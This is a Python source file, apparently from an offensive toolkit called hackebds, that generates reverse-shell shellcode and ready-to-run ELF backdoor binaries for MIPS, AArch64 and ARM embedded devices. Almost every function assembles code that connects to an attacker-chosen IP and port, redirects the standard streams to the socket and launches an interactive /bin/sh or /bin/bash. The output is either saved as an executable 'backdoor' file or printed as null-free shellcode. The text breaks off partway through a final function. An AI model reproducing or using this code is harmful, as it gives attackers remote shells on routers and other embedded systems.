from . import extract_shellcode
from pwn import *
import argparse
from . import model_choise
from . import cve_info
import os
from hackebds.ESH import *
from hackebds.powerpc_info import *
from . import powerpc_info
from colorama import Fore,Back,Style
from . import sparc32
from . import sparc64
from . import backdoor_encode
from . import hackebds_cmd
import string
from . import my_package
from . import power_reverse_shell
from . import power_bind_shell
from . import mips32n

chars = string.ascii_letters

def mipsel_backdoor(shell_path ,reverse_ip,reverse_port, envp ,filename=None):
	context.arch='mips'
	context.endian='little'
	context.bits="32"
	log.success("reverse_ip is set to "+ reverse_ip)
	log.success("reverse_port is set to "+str(reverse_port))
	shell_path_list = []
	if shell_path == "/bin/bash" or shell_path == "bash":
		shell_path = "/bin/bash"
		shell_path_list.append(shell_path)
		shell_path_list.append("-i")
	elif shell_path == "/bin/sh" or shell_path == "sh":
		shell_path = "/bin/sh"
		shell_path_list.append(shell_path)
		shell_path_list.append("-i")
	else:
		log.info("now shell is only support sh and bash")
		return 
	if(envp == None):
		envp = 0
	else:
		envp = my_package.get_envir_args(envp)
	shellcode_connect=asm(shellcraft.connect(reverse_ip,reverse_port))
	shellcode_dump_sh='''
	move $a0,$s0
	nor $a1,$zero,-1
	li  $v0,0xfdf
	syscall 0x40404
	move $a0,$s0
	li  $t9,-2
	nor $a1,$t9,$zero
	li  $v0,0xfdf
	syscall 0x40404
	move $a0,$s0
	li  $t9,-3
	nor $a1,$t9,$zero
	li  $v0,0xfdf
	syscall 0x40404
	'''
	shellcode_dump_sh=asm(shellcode_dump_sh)
	shellcode_execve=asm(shellcraft.execve(shell_path ,shell_path_list, envp))
	ELF_data_shellcode=shellcode_connect+shellcode_dump_sh+shellcode_execve
	ELF_data=make_elf(ELF_data_shellcode)
	if filename==None:
		log.info("waiting 3s")
		sleep(1)
		filename=context.arch + "-backdoor-" + my_package.random_string_generator(4,chars)
		f=open(filename,"wb")
		f.write(ELF_data)
		f.close()
		os.chmod(filename, 0o755)
		log.success("{} is ok in current path ./".format(filename))
		context.arch='i386'
		context.bits="32"
		context.endian="little"
		return 
	else:
		if(os.path.exists(filename) != True):
			log.info("waiting 3s")
			sleep(1)
			f=open(filename,"wb")
			f.write(ELF_data)
			f.close()
			os.chmod(filename, 0o755)
			log.success("{} generated successfully".format(filename))
			context.arch='i386'
			context.bits="32"
			context.endian="little"
			return 
		else:
			print(Fore.RED+"[+]"+" be careful File existence may overwrite the file (y/n) "+Fore.RESET,end='')
			choise = input()
			if choise == "y\n" or choise == "\n":
				log.info("waiting 3s")
				sleep(1)
				f=open(filename,"wb")
				f.write(ELF_data)
				f.close()
				os.chmod(filename, 0o755)
				log.success("{} generated successfully".format(filename))
				context.arch='i386'
				context.bits="32"
				context.endian="little"
				return 
			else:
				return 


def aarch64_backdoor(shell_path ,reverse_ip,reverse_port, envp ,filename=None):
	context.arch='aarch64'
	context.endian='little'
	context.bits="64"
	log.success("reverse_ip is set to "+ reverse_ip)
	log.success("reverse_port is set to "+str(reverse_port))
	if shell_path == "/bin/bash" or shell_path == "bash":
		shellcode3 = '''
/* execve(path='/bin/bash', argv=['/bin/bash', '-i'], envp=0) */
/* push b'/bin/bash\x00' */
/* Set x14 = 8314034342958031407 = 0x7361622f6e69622f */
mov  x14, #25135
movk x14, #28265, lsl #16
movk x14, #25135, lsl #0x20
movk x14, #29537, lsl #0x30
mov  x15, #104
stp x14, x15, [sp, #-16]!
mov  x0, sp
/* push argument array [b'/bin/bash\x00', b'-i\x00'] */
/* push b'/bin/bash\x00-i\x00' */
/* Set x14 = 8314034342958031407 = 0x7361622f6e69622f */
mov  x14, #25135
movk x14, #28265, lsl #16
movk x14, #25135, lsl #0x20
movk x14, #29537, lsl #0x30
/* Set x15 = 1764556904 = 0x692d0068 */
mov  x15, #104
movk x15, #26925, lsl #16
stp x14, x15, [sp, #-16]!

/* push null terminator */
mov  x14, xzr
str x14, [sp, #-8]!

/* push pointers onto the stack */
mov  x14, #18
add x14, sp, x14
sub sp, sp ,8
str x14, [sp, #-8]!
mov  x14, #24
add x14, sp, x14
sub sp, sp, 8
stp x5, x14 , [sp, #-8]!

add x1, sp, 8

/* set x1 to the current top of the stack */
mov  x2, xzr
/* call execve() */
mov  x8, #0xdd
svc 0

		'''
	elif shell_path == "/bin/sh" or shell_path == "sh":
		shellcode3 = '''
mov  x14, #25135
movk x14, #28265, lsl #16
movk x14, #29487, lsl #0x20
movk x14, #104, lsl #0x30
str x14, [sp, #-16]!
mov  x0, sp
/* push argument array [b'/bin/sh\x00', b'-i\x00'] */
/* push b'/bin/sh\x00-i\x00' */
/* Set x14 = 29400045130965551 = 0x68732f6e69622f */
mov  x14, #25135
movk x14, #28265, lsl #16
movk x14, #29487, lsl #0x20
movk x14, #104, lsl #0x30
mov  x15, #26925
stp x14, x15, [sp, #-16]!

/* push null terminator */
mov  x14, xzr
str x14, [sp, #-8]!

/* push pointers onto the stack */
mov  x14, #16
add x14, sp, x14
sub sp, sp, 8

str x14, [sp, #-8]! /* b'/bin/sh\x00' */
mov  x14, #24
add x14, sp, x14
sub sp, sp, 8
str x14, [sp, #0]! /* b'-i\x00' */

mov x1, sp

/* set x1 to the current top of the stack */
mov  x2, xzr
/* call execve() */
mov  x8, #0xdd
svc 0


		'''
	else:
		log.info("now shell is only support sh and bash")
		return 
	if(envp == None):
		envp = 0
	else:
		envp = my_package.get_envir_args(envp)
	basic_shellcode=asm(shellcraft.connect(reverse_ip,reverse_port))
	shellcode2='''
	mov x0,x12
	mov x1,#0
	mov x2,#0
	mov x8,#0x18
	svc #0x1337
	mov x0,x12
	mov x1,#1
	svc #1337
	mov x0,x12
	mov x1,#2
	svc #1337
	'''
	shellcode2=asm(shellcode2)
	#shellcode3=asm(shellcraft.execve(shell_path, shell_path_list, envp))
	shellcode3 = asm(shellcode3)
	all_reverseshell=basic_shellcode+shellcode2+shellcode3
	ELF_data=make_elf(all_reverseshell)
	if filename==None:
		filename="backdoor_aarch64"
		log.info("waiting 3s")
		sleep(1)
		filename=context.arch + "-backdoor-" + my_package.random_string_generator(4,chars)
		f=open(filename,"wb")
		f.write(ELF_data)
		f.close()
		os.chmod(filename, 0o755)
		log.success("{} is ok in current path ./".format(filename))
		context.arch='i386'
		context.bits="32"
		context.endian="little"
		return all_reverseshell
	else:
		if(os.path.exists(filename) != True):
			log.info("waiting 3s")
			sleep(1)
			f=open(filename,"wb")
			f.write(ELF_data)
			f.close()
			os.chmod(filename, 0o755)
			log.success("{} generated successfully".format(filename))
			context.arch='i386'
			context.bits="32"
			context.endian="little"
			return all_reverseshell
		else:
			print(Fore.RED+"[+]"+" be careful File existence may overwrite the file (y/n) "+Fore.RESET,end='')
			choise = input()
			if choise == "y\n" or choise == "\n":
				log.info("waiting 3s")
				sleep(1)
				f=open(filename,"wb")
				f.write(ELF_data)
				f.close()
				log.success("{} generated successfully".format(filename))
				os.chmod(filename, 0o755)
				context.arch='i386'
				context.bits="32"
				context.endian="little"
				return all_reverseshell
			else:
				return all_reverseshell

def aarch64_reverse_sl(reverse_ip,reverse_port):
	context.arch='aarch64'
	context.endian='little'
	context.bits="64"
	log.success("reverse_ip is set to "+ reverse_ip)
	log.success("reverse_port is set to "+str(reverse_port))
	handle_port="0x"+enhex(p16(reverse_port))
	handle_ip=list(reverse_ip.split('.'))
	handle_ip_high=hex((int(handle_ip[1])<<8)+int(handle_ip[0]))
	handle_ip_low=hex((int(handle_ip[3])<<8)+int(handle_ip[2]))
	shellcode='''
	mov x10,#0x100
	sub x0,x10,#0xfe
	sub x1,x10,#0xff
	mov x2,xzr
	mov x8,#0xc6
	svc #0x1337
	str x0,[sp,#-0x10]!
	ldr x12,[sp]
	sub x14,x10,#0xfe
	movk x14,#%s,lsl #16
	movk x14,#%s,lsl #32
	movk x14,#%s, lsl #48
	str x14, [sp,#-0x20]!
	add x11,sp,#0x100
	sub x1,x11,#0x100
	mov x2,#0x10
	mov x8,#0xcb
	svc #0x1337
	mov x0,x12
	mov x1,xzr
	mov x2,xzr
	mov x8,#0x18
	svc #0x1337
	mov x0,x12
	mov x10,#0x100
	sub x1,x10,#0xff
	svc #0x1337
	mov x0,x12
	sub x1,x10,#0xfe
	svc #0x1337
	mov     x14, #0x622f
	movk    x14, #0x6e69, lsl #16
	movk    x14, #0x732f, lsl #32
	movk    x14, #0x68, lsl #48
	str     x14, [sp, #-16]!
	add     sp,sp,#0x100
	sub     x0,sp,#0x100
	sub     sp,sp,#0x100
	mov     x14, #0x622f
	movk    x14, #0x6e69, lsl #16
	movk    x14, #0x732f, lsl #32
	movk    x14, #0x68, lsl #48
	str     x14, [sp, #-16]!
	mov     x14, xzr
	str     x14, [sp, #-0x10]!
	mov     x14, #0x10
	mov     x2, xzr
	add     x14, sp, x14
	stp     x2,x14,[sp,#-0x30]!
	add     sp,sp,#0x100
	sub     x1,sp,#0xf8
	sub     sp,sp,#0x100
	mov     x8, #0xdd 
	svc     #0x1337
	'''
	shellcode=shellcode%(handle_port,handle_ip_high,handle_ip_low)
	shellcode=asm(shellcode)
	shellcode_hex=''
	shellcode_hex=extract_shellcode.extract_sl_print(shellcode,shellcode_hex)
	shellcode_len=len(shellcode)
	if "\\x00" in shellcode_hex:
		#log.info("waiting 3s")
		#sleep(1)
		log.info("pay attaction NULL byte in shellcode(len is {})".format(shellcode_len))
		log.info("the null byte in %d"%int(shellcode.index("\x00")))
		print(shellcode_hex)
		context.arch='i386'
		context.bits="32"
		context.endian="little"
		return shellcode
	else:
		#log.info("waiting 3s")
		#sleep(1)
		log.success("No NULL byte shellcode for hex(len is {}):".format(shellcode_len))
		print(shellcode_hex)
		context.arch='i386'
		context.bits="32"
		context.endian="little"
		return shellcode


def armelv7_backdoor(shell_path ,reverse_ip,reverse_port, envp,filename=None):
	context.arch='arm'
	context.endian='little'
	context.bits="32"
	log.success("reverse_ip is set to "+ reverse_ip)
	log.success("reverse_port is set to "+str(reverse_port))
	shell_path_list = []
	if shell_path == "/bin/bash" or shell_path == "bash":
		shell_path = "/bin/bash"
		shell_path_list.append(shell_path)
		shell_path_list.append("-i")
	elif shell_path == "/bin/sh" or shell_path == "sh":
		shell_path = "/bin/sh"
		shell_path_list.append(shell_path)
		shell_path_list.append("-i")
	else:
		log.info("now shell is only support sh and bash")
		return 
	if(envp == None):
		envp = 0
	else:
		envp = my_package.get_envir_args(envp)
	basic_shellcode=asm(shellcraft.connect(reverse_ip,reverse_port))
	shellcode2='''
	mov r5,r6
	mov r0,r5
	mov r1,#0
	movw r7,#0x3f
	svc #0
	mov r0,r5
	mov r1,#1
	svc #0
	mov r0,r5
	mov r1,#2
	svc #0
	'''
	shellcode2=asm(shellcode2)
	shellcode3=asm(shellcraft.execve(shell_path, shell_path_list, envp))
	all_reverseshell=basic_shellcode+shellcode2+shellcode3
	ELF_data=make_elf(all_reverseshell)
	if filename==None:
		log.info("waiting 3s")
		sleep(1)
		filename=context.arch + "-backdoor-" + my_package.random_string_generator(4,chars)
		f=open(filename,"wb")
		f.write(ELF_data)
		f.close()
		os.chmod(filename, 0o755)
		log.success("{} is ok in current path ./".format(filename))
		context.arch='i386'
		context.bits="32"
		context.endian="little"
	else:
		if(os.path.exists(filename) != True):
			log.info("waiting 3s")
			sleep(1)
			f=open(filename,"wb")
			f.write(ELF_data)
			f.close()
			os.chmod(filename, 0o755)
			log.success("{} generated successfully".format(filename))
			context.arch='i386'
			context.bits="32"
			context.endian="little"
		else:
			print(Fore.RED+"[+]"+" be careful File existence may overwrite the file (y/n) "+Fore.RESET,end='')
			choise = input()
			if choise == "y\n" or choise == "\n":
				log.info("waiting 3s")
				sleep(1)
				f=open(filename,"wb")
				f.write(ELF_data)
				f.close()
				os.chmod(filename, 0o755)
				log.success("{} generated successfully".format(filename))
				context.arch='i386'
				context.bits="32"
				context.endian="little"
			else:
				return 

def armelv7_reverse_sl(reverse_ip,reverse_port):
	context.arch='arm'
	context.endian='little'
	context.bits="32"
	shellcode='''
	.ARM
	eor r4,r4,r4
	%s
	strb r7,[sp,#-0x28]
	%s
	strb r7,[sp,#-0x27]
	%s
	strb r7,[sp,#-0x26]
	%s
	strb r7,[sp,#-0x25]
	mov r7,#2
	strb r7,[sp,#-0x2c]
	strb r4,[sp,#-0x2b]
	%s
	strb r7,[sp,#-0x2a]
	%s
	strb r7,[sp,#-0x29]
	strb r4,[sp,#-0x14]
	mov r7,#0x68
	strb r7,[sp,#-0x15]
	mov r7,#0x73
	strb r7,[sp,#-0x16]
	mov r7,#0x2f
	strb r7,[sp,#-0x17]
	mov r7,#0x6e
	strb r7,[sp,#-0x18]
	mov r7,#0x69
	strb r7,[sp,#-0x19]
	mov r7,#0x62
	strb r7,[sp,#-0x1a]
	mov r7,#0x2f
	strb r7,[sp,#-0x1b]
	add r4,sp,#-0x1b
	add r5,sp,#-0x2c
	add r3,pc,#1
	bx  r3
	.THUMB
	mov r1,#2
	mov r0,r1
	mov r1,#1
	eor r2,r2,r2
	mov r7,#200
	add r7,r7,#81
	svc #1
	mov r6,r0
	mov r1,r5
	mov r2,#0x10
	add r7,r7,#2
	svc #1
	mov r0,r6
	eor r1,r1,r1
	mov r7,#63
	svc #1
	mov r0,r6
	add r1,r1,#1
	svc #1
	mov r0,r6
	add r1,r1,#1
	svc #1
	mov r0,r4
	eor r1,r1,r1
	eor r2,r2,r2
	push {r0,r1}
	mov r1,sp
	mov r7,#0xb
	svc #1
	'''
	log.success("reverse_ip is set to "+ reverse_ip)
	log.success("reverse_port is set to "+str(reverse_port))
	handle_ip=reverse_ip.split('.')
	handle_port=list(p16(reverse_port)[::-1])
	for i in range(len(handle_ip)):
		if handle_ip[i]!="0":
			handle_ip[i]="mov r7,#"+handle_ip[i]
		else:
			handle_ip[i]="eor r7,r7,r7"
	for i in range(len(handle_port)):
		if handle_port[i]!="\x00":
			handle_port[i]="mov r7,#"+str(handle_port[i])
		else:
			handle_port[i]="eor r7,r7,r7"

	shellcode=shellcode%(handle_ip[0],handle_ip[1],handle_ip[2],handle_ip[3],handle_port[0],handle_port[1])
	#print shellcode
	#str(u8(handle_port[0])),str(u8(handle_port[1])
	#handle_ip[0],handle_ip[1],handle_ip[2],handle_ip[3]
	shellcode=asm(shellcode)[:-2]
	shellcode_hex=''
	shellcode_hex=extract_shellcode.extract_sl_print(shellcode,shellcode_hex)
	shellcode_len=len(shellcode)
	if "\\x00" in shellcode_hex:
		#log.info("waiting 3s")
		#sleep(1)
		log.info("pay attaction NULL byte in shellcode(len is {})".format(shellcode_len))
		#print shellcode.index("\x00")
		log.info("the null byte in %d"%(int(shellcode.index(b"\x00"))))
		print(shellcode_hex)
		context.arch='i386'
		context.bits="32"
		context.endian="little"
		return shellcode

	else:
		#log.info("waiting 3s")
		#sleep(1)
		log.success("No NULL byte shellcode for hex(len is {}):".format(shellcode_len))
		print(shellcode_hex)
		return shellcode



def armelv5_backdoor(shell_path ,reverse_ip,reverse_port, envp,filename=None):
	context.bits="32"
	context.arch='arm'
	context.endian='little'
	shell_path_list = []
	if shell_path == "/bin/bash" or shell_path == "bash":
		shellcode='''
	.ARM
	eor r4,r4,r4
	%s
	strb r7,[sp,#-0x28]
	%s
	strb r7,[sp,#-0x27]
	%s
	strb r7,[sp,#-0x26]
	%s
	strb r7,[sp,#-0x25]
	mov r7,#2
	strb r7,[sp,#-0x2c]
	strb r4,[sp,#-0x2b]
	%s
	strb r7,[sp,#-0x2a]
	%s
	strb r7,[sp,#-0x29]
	strb r4,[sp,#-0x14]
	mov r7,#0x68
	strb r7,[sp,#-0x15]
	mov r7,#0x73
	strb r7,[sp,#-0x16]
	mov r7,#0x61
	strb r7,[sp,#-0x17]
	mov r7,#0x62
	strb r7,[sp,#-0x18]
	mov r7,#0x2f
	strb r7,[sp,#-0x19]
	mov r7,#0x6e
	strb r7,[sp,#-0x1a]
	mov r7,#0x69
	strb r7,[sp,#-0x1b]
	mov r7,#0x62
	strb r7,[sp,#-0x1c]
	mov r7,#0x2f
	strb r7,[sp,#-0x1d]
	eor r7, r7
	strb r7,[sp,#-0x1e]
	mov r7,#0x69
	strb r7,[sp,#-0x1f]
	mov r7,#0x2d
	strb r7,[sp,#-0x20]
	add r4,sp,#-0x1d
	add r5,sp,#-0x2c
	add r8,sp,#-0x20
	add r3,pc,#1
	bx  r3
	.THUMB
	mov r1,#2
	mov r0,r1
	mov r1,#1
	eor r2,r2,r2
	mov r7,#200
	add r7,r7,#81
	svc #1
	mov r6,r0
	mov r1,r5
	mov r2,#0x10
	add r7,r7,#2
	svc #1
	mov r0,r6
	eor r1,r1,r1
	mov r7,#63
	svc #1
	mov r0,r6
	add r1,r1,#1
	svc #1
	mov r0,r6
	add r1,r1,#1
	svc #1
	mov r0,r4
	eor r1,r1,r1
	eor r2,r2,r2
	push {r1}
	push {r0,r8}
	mov r1,sp
	mov r7,#0xb
	svc #1

	'''
	elif shell_path == "/bin/sh" or shell_path == "sh":
		shellcode='''
	.ARM
	eor r4,r4,r4
	%s
	strb r7,[sp,#-0x28]
	%s
	strb r7,[sp,#-0x27]
	%s
	strb r7,[sp,#-0x26]
	%s
	strb r7,[sp,#-0x25]
	mov r7,#2
	strb r7,[sp,#-0x2c]
	strb r4,[sp,#-0x2b]
	%s
	strb r7,[sp,#-0x2a]
	%s
	strb r7,[sp,#-0x29]
	strb r4,[sp,#-0x14]
	mov r7,#0x68
	strb r7,[sp,#-0x15]
	mov r7,#0x73
	strb r7,[sp,#-0x16]
	mov r7,#0x2f
	strb r7,[sp,#-0x17]
	mov r7,#0x6e
	strb r7,[sp,#-0x18]
	mov r7,#0x69
	strb r7,[sp,#-0x19]
	mov r7,#0x62
	strb r7,[sp,#-0x1a]
	mov r7,#0x2f
	strb r7,[sp,#-0x1b]
	mov r7,#0x69
	strb r7,[sp,#-0x1f]
	mov r7,#0x2d
	strb r7,[sp,#-0x20]
	add r4,sp,#-0x1b
	add r5,sp,#-0x2c
	add r8,sp,#-0x20
	add r3,pc,#1
	bx  r3
	.THUMB
	mov r1,#2
	mov r0,r1
	mov r1,#1
	eor r2,r2,r2
	mov r7,#200
	add r7,r7,#81
	svc #1
	mov r6,r0
	mov r1,r5
	mov r2,#0x10
	add r7,r7,#2
	svc #1
	mov r0,r6
	eor r1,r1,r1
	mov r7,#63
	svc #1
	mov r0,r6
	add r1,r1,#1
	svc #1
	mov r0,r6
	add r1,r1,#1
	svc #1
	mov r0,r4
	eor r1,r1,r1
	eor r2,r2,r2
	push {r1}
	push {r0,r8}
	mov r1,sp
	mov r7,#0xb
	svc #1

	'''
	else:
		log.info("now shell is only support sh and bash")
		return 
	if(envp == None):
		envp = 0
	else:
		envp = my_package.get_envir_args(envp)
	log.success("reverse_ip is set to "+ reverse_ip)
	log.success("reverse_port is set to "+str(reverse_port))
	handle_ip=reverse_ip.split('.')
	handle_port=list(p16(reverse_port)[::-1])
	for i in range(len(handle_ip)):
		if handle_ip[i]!="0":
			handle_ip[i]="mov r7,#"+handle_ip[i]
		else:
			handle_ip[i]="eor r7,r7,r7"
	for i in range(len(handle_port)):
		if handle_port[i]!="\x00":
			handle_port[i]="mov r7,#"+str(handle_port[i])
		else:
			handle_port[i]="eor r7,r7,r7"

	shellcode=shellcode%(handle_ip[0],handle_ip[1],handle_ip[2],handle_ip[3],handle_port[0],handle_port[1])
	#print shellcode
	#str(u8(handle_port[0])),str(u8(handle_port[1])
	#handle_ip[0],handle_ip[1],handle_ip[2],handle_ip[3]
	shellcode=asm(shellcode)[:-2]
	ELF_data = make_elf(shellcode)
	if filename==None:
		log.info("waiting 3s")
		sleep(1)
		filename=context.arch + "-backdoor-" + my_package.random_string_generator(4,chars)
		f=open(filename,"wb")
		f.write(ELF_data)
		f.close()
		os.chmod(filename, 0o755)
		log.success("{} is ok in current path ./".format(filename))
		context.arch='i386'
		context.bits="32"
		context.endian="little"
	else:
		if(os.path.exists(filename) != True):
			log.info("waiting 3s")
			sleep(1)
			f=open(filename,"wb")
			f.write(ELF_data)
			f.close()
			os.chmod(filename, 0o755)
			log.success("{} generated successfully".format(filename))
			context.arch='i386'
			context.bits="32"
			context.endian="little"
		else:
			print(Fore.RED+"[+]"+" be careful File existence may overwrite the file (y/n) "+Fore.RESET,end='')
			choise = input()
			if choise == "y\n" or choise == "\n":
				log.info("waiting 3s")
				sleep(1)
				f=open(filename,"wb")
				f.write(ELF_data)
				f.close()
				os.chmod(filename, 0o755)
				log.success("{} generated successfully".format(filename))
				context.arch='i386'
				context.bits="32"
				context.endian="little"
			else:
				return 


def armelv5_reverse_sl(reverse_ip,reverse_port):
	context.bits="32"
	context.arch='arm'
	context.endian='little'
	shellcode='''
	.ARM
	eor r4,r4,r4
	%s
	strb r7,[sp,#-0x28]
	%s
	strb r7,[sp,#-0x27]
	%s
	strb r7,[sp,#-0x26]
	%s
	strb r7,[sp,#-0x25]
	mov r7,#2
	strb r7,[sp,#-0x2c]
	strb r4,[sp,#-0x2b]
	%s
	strb r7,[sp,#-0x2a]
	%s
	strb r7,[sp,#-0x29]
	strb r4,[sp,#-0x14]
	mov r7,#0x68
	strb r7,[sp,#-0x15]
	mov r7,#0x73
	strb r7,[sp,#-0x16]
	mov r7,#0x2f
	strb r7,[sp,#-0x17]
	mov r7,#0x6e
	strb r7,[sp,#-0x18]
	mov r7,#0x69
	strb r7,[sp,#-0x19]
	mov r7,#0x62
	strb r7,[sp,#-0x1a]
	mov r7,#0x2f
	strb r7,[sp,#-0x1b]
	add r4,sp,#-0x1b
	add r5,sp,#-0x2c
	add r3,pc,#1
	bx  r3
	.THUMB
	mov r1,#2
	mov r0,r1
	mov r1,#1
	eor r2,r2,r2
	mov r7,#200
	add r7,r7,#81
	svc #1
	mov r6,r0
	mov r1,r5
	mov r2,#0x10
	add r7,r7,#2
	svc #1
	mov r0,r6
	eor r1,r1,r1
	mov r7,#63
	svc #1
	mov r0,r6
	add r1,r1,#1
	svc #1
	mov r0,r6
	add r1,r1,#1
	svc #1
	mov r0,r4
	eor r1,r1,r1
	eor r2,r2,r2
	push {r0,r1}
	mov r1,sp
	mov r7,#0xb
	svc #1
	'''
	log.success("reverse_ip is set to "+ reverse_ip)
	log.success("reverse_port is set to "+ str(reverse_port))
	handle_ip=reverse_ip.split('.')
	handle_port=list(p16(reverse_port)[::-1])
	for i in range(len(handle_ip)):
		if handle_ip[i]!="0":
			handle_ip[i]="mov r7,#"+handle_ip[i]
		else:
			handle_ip[i]="eor r7,r7,r7"
	for i in range(len(handle_port)):
		if handle_port[i]!="\x00":
			handle_port[i]="mov r7,#"+str(handle_port[i])
		else:
			handle_port[i]="eor r7,r7,r7"

	shellcode=shellcode%(handle_ip[0],handle_ip[1],handle_ip[2],handle_ip[3],handle_port[0],handle_port[1])
	#print shellcode
	#str(u8(handle_port[0])),str(u8(handle_port[1])
	#handle_ip[0],handle_ip[1],handle_ip[2],handle_ip[3]
	shellcode=asm(shellcode)[:-2]
	shellcode_hex=''
	shellcode_hex=extract_shellcode.extract_sl_print(shellcode,shellcode_hex)
	shellcode_len=len(shellcode)
	if "\\x00" in shellcode_hex:
		#log.info("waiting 3s")
		#sleep(1)
		log.info("pay attaction NULL byte in shellcode(len is {})".format(shellcode_len))
		log.info("the null byte in %d"%(int(shellcode.index(b"\x00"))))
		print(shellcode_hex)
		context.arch='i386'
		context.bits="32"
		context.endian="little"
		#print(shellcode_hex)
		return shellcode
	else:
		#log.info("waiting 3s")
		#sleep(1)
		log.success("No NULL byte shellcode for hex(len is {}):".format(shellcode_len))
		print(shellcode_hex)
		context.arch='i386'
		context.bits="32"
		context.endian="little"
		#print(shellcode_hex)
		return shellcode

def armebv7_reverse_sl(reverse_ip,reverse_port):
	context.bits="32"
	context.arch='arm'
	context.endian='big'
	shellcode='''
	.ARM
	eor r4,r4,r4
	%s
	strb r7,[sp,#-0x28]
	%s
	strb r7,[sp,#-0x27]
	%s
	strb r7,[sp,#-0x26]
	%s
	strb r7,[sp,#-0x25]
	mov r7,#2
	strb r7,[sp,#-0x29]
	strb r4,[sp,#-0x2a]
	%s
	strb r7,[sp,#-0x2b]
	%s
	strb r7,[sp,#-0x2c]
	strb r4,[sp,#-0x14]
	mov r7,#0x68
	strb r7,[sp,#-0x15]
	mov r7,#0x73
	strb r7,[sp,#-0x16]
	mov r7,#0x2f
	strb r7,[sp,#-0x17]
	mov r7,#0x6e
	strb r7,[sp,#-0x18]
	mov r7,#0x69
	strb r7,[sp,#-0x19]
	mov r7,#0x62
	strb r7,[sp,#-0x1a]
	mov r7,#0x2f
	strb r7,[sp,#-0x1b]
	add r4,sp,#-0x1b
	add r5,sp,#-0x2c
	add r3,pc,#1
	bx  r3
	.THUMB
	mov r1,#2
	mov r0,r1
	mov r1,#1
	eor r2,r2,r2
	mov r7,#200
	add r7,r7,#81
	svc #1
	mov r6,r0
	mov r1,r5
	mov r2,#0x10
	add r7,r7,#2
	svc #1
	mov r0,r6
	eor r1,r1,r1
	mov r7,#63
	svc #1
	mov r0,r6
	add r1,r1,#1
	svc #1
	mov r0,r6
	add r1,r1,#1
	svc #1
	mov r0,r4
	eor r1,r1,r1
	eor r2,r2,r2
	push {r0,r1}
	mov r1,sp
	mov r7,#0xb
	svc #1
	'''
	log.success("reverse_ip is set to "+ reverse_ip)
	log.success("reverse_port is set to "+ str(reverse_port))
	handle_ip=reverse_ip.split('.')[::-1]
	handle_port=list(str(reverse_port))
	for i in range(len(handle_ip)):
		if handle_ip[i]!="0":
			handle_ip[i]="mov r7,#"+handle_ip[i]
		else:
			handle_ip[i]="eor r7,r7,r7"
	for i in range(len(handle_port)):
		if handle_port[i]!="\x00":
			handle_port[i]="mov r7,#"+str(handle_port[i])
		else:
			handle_port[i]="eor r7,r7,r7"

	shellcode=shellcode%(handle_ip[0],handle_ip[1],handle_ip[2],handle_ip[3],handle_port[0],handle_port[1])
	#print shellcode
	#str(u8(handle_port[0])),str(u8(handle_port[1])
	#handle_ip[0],handle_ip[1],handle_ip[2],handle_ip[3]
	shellcode=asm(shellcode)[:-2]
	shellcode_hex=''
	shellcode_hex=extract_shellcode.extract_sl_print(shellcode,shellcode_hex)
	shellcode_len=len(shellcode)
	if "\\x00" in shellcode_hex:
		#sleep(1)
		#log.info("waiting 3s")
		log.info("pay attaction NULL byte in shellcode(len is {})".format(shellcode_len))
		log.success("the null byte in %d"%int(shellcode.index(b"\x00")))
		print(shellcode_hex)
		context.arch='i386'
		context.bits="32"
		context.endian="little"
		return shellcode
	else:
		#log.info("waiting 3s")
		log.success("No NULL byte shellcode for hex(len is {}):".format(shellcode_len))
		print(shellcode_hex)
		context.arch='i386'
		context.bits="32"
		context.endian="little"
		return shellcode

def armebv5_reverse_sl(reverse_ip,reverse_port):
	context.bits="32"
	context.arch='arm'
	context.endian='big'
	shellcode='''
	.ARM
	eor r4,r4,r4
	%s
	strb r7,[sp,#-0x28]
	%s
	strb r7,[sp,#-0x27]
	%s
	strb r7,[sp,#-0x26]
	%s
	strb r7,[sp,#-0x25]
	mov r7,#2
	strb r7,[sp,#-0x2b]
	strb r4,[sp,#-0x2c]
	%s
	strb r7,[sp,#-0x2a]
	%s
	strb r7,[sp,#-0x29]
	strb r4,[sp,#-0x14]
	mov r7,#0x68
	strb r7,[sp,#-0x15]
	mov r7,#0x73
	strb r7,[sp,#-0x16]
	mov r7,#0x2f
	strb r7,[sp,#-0x17]
	mov r7,#0x6e
	strb r7,[sp,#-0x18]
	mov r7,#0x69
	strb r7,[sp,#-0x19]
	mov r7,#0x62
	strb r7,[sp,#-0x1a]
	mov r7,#0x2f
	strb r7,[sp,#-0x1b]
	add r4,sp,#-0x1b
	add r5,sp,#-0x2c
	add r3,pc,#1
	bx  r3
	.THUMB
	mov r1,#2
	mov r0,r1
	mov r1,#1
	eor r2,r2,r2
	mov r7,#200
	add r7,r7,#81
	svc #1
	mov r6,r0
	mov r1,r5
	mov r2,#0x10
	add r7,r7,#2
	svc #1
	mov r0,r6
	eor r1,r1,r1
	mov r7,#63
	svc #1
	mov r0,r6
	add r1,r1,#1
	svc #1
	mov r0,r6
	add r1,r1,#1
	svc #1
	mov r0,r4
	eor r1,r1,r1
	eor r2,r2,r2
	push {r0,r1}
	mov r1,sp
	mov r7,#0xb
	svc #1
	'''
	log.success("reverse_ip is set to "+ reverse_ip)
	log.success("reverse_port is set to "+ str(reverse_port))
	handle_ip=reverse_ip.split('.')[::-1]
	handle_port=list(p16(reverse_port)[::-1])
	print(handle_port)
	for i in range(len(handle_ip)):
		if handle_ip[i]!="0":
			handle_ip[i]="mov r7,#"+handle_ip[i]
		else:
			handle_ip[i]="eor r7,r7,r7"
	for i in range(len(handle_port)):
		if handle_port[i]!="\x00":
			handle_port[i]="mov r7,#"+str(handle_port[i])
		else:
			handle_port[i]="eor r7,r7,r7"

	shellcode=shellcode%(handle_ip[3],handle_ip[2],handle_ip[1],handle_ip[0],handle_port[1],handle_port[0])
	#print shellcode
	#str(u8(handle_port[0])),str(u8(handle_port[1])
	#handle_ip[0],handle_ip[1],handle_ip[2],handle_ip[3]
	shellcode=asm(shellcode)[:-2]
	shellcode_hex=''
	shellcode_hex=extract_shellcode.extract_sl_print(shellcode,shellcode_hex)
	shellcode_len=len(shellcode)
	if "\\x00" in shellcode_hex:
		#log.info("waiting 3s")
		log.info("pay attaction NULL byte in shellcode(len is {})".format(shellcode_len))
		log.info("the null byte in %d"%int(shellcode.index(b"\x00")))
		print(shellcode_hex)
		context.arch='i386'
		context.bits="32"
		context.endian="little"
		return shellcode
	else:
		#log.info("waiting 3s")
		log.success("No NULL byte shellcode for hex(len is {}):".format(shellcode_len))
		print(shellcode_hex)
		context.arch='i386'
		context.bits="32"
		context.endian="little"
		return shellcode

def armebv7_backdoor(shell_path ,reverse_ip,reverse_port, envp,filename=None):
	context.bits="32"
